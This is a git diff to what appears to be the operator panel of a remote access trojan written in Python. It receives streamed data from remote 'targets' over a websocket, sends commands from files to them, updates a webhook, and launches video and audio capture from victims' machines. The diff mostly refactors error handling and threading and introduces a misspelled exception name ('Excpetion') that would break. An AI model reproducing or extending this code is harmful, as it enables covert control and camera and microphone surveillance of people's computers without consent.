@@ -262,13 +262,19 @@ class Main:
                 self.Stop = True
 
         def update(self, panel, endpoint, ws, target):
-            l = time.time()
+            start_time = time.time()
             while not self.Stop:
-                j = json.loads(ws.recv())
-                if (abs(j["t"]-time.time()) < 2.5) and (j["t"] > l):
+                try:
+                    recv_data = json.loads(ws.recv())
+                except:
+                    ws = create_connection(f"wss://{self.host}/api/ws/{endpoint}")
+                    ws.send(self.key)
+                    ws.send(target)
+
+                if ( abs(recv_data["t"]- time.time() ) < 2.5) and (recv_data["t"] > start_time):
                     continue
                 try:
-                    data = base64.b64decode(j["data"])
+                    data = base64.b64decode(recv_data["data"])
                     threading.Thread(target=self.edit, args=(panel, data)).start()
                 except Exception as e:
                     print(e)
@@ -434,12 +440,13 @@ Ice Bear#0167   |   Ice Bear#0167  |   Ice Bear#0167  |   Ice Bear#0167  |   Ice
                     try:
                         uiprint("Type the filename below:")
                         filename = input(f"{self.indent}>>")
-                        command = open(filename, "r+")
+                        command = open(filename, "rb").read().decode()
                         break
                     except KeyboardInterrupt:
                         break
 
-                    except:
+                    except Excpetion as e:
+                        print(e)
                         uiprint("Invalid filename!", "error")
 
                         self.send_command(command, target)
@@ -453,23 +460,14 @@ Ice Bear#0167   |   Ice Bear#0167  |   Ice Bear#0167  |   Ice Bear#0167  |   Ice
                 command = f"updateWebhook:{webhook}"
                 self.send_command(command, target)
 
-            elif choice == 6:
-                try:
-                    threading.Thread(target=self.Video, args=(self.target, 0, self.host, self.key)).start()
-                except:
-                    pass
-
-            elif choice == 7:
-                try:
-                    threading.Thread(target=self.Video, args=(self.target, 1, self.host, self.key)).start()
-                except:
-                    pass
-
-            elif choice == 8:
-                try:
-                    threading.Thread(target=self.Audio, args=(self.target, self.host, self.key)).start()
-                except Exception as e:
-                    pass
+            elif choice == 6:                
+                self.Video(target, 0, self.host, self.key)
+                
+            elif choice == 7:                
+                self.Video(target, 1, self.host, self.key)
+                
+            elif choice == 8:                
+                self.Audio(target, self.host, self.key)
 
             if command:
                 self.send_command(command, target)
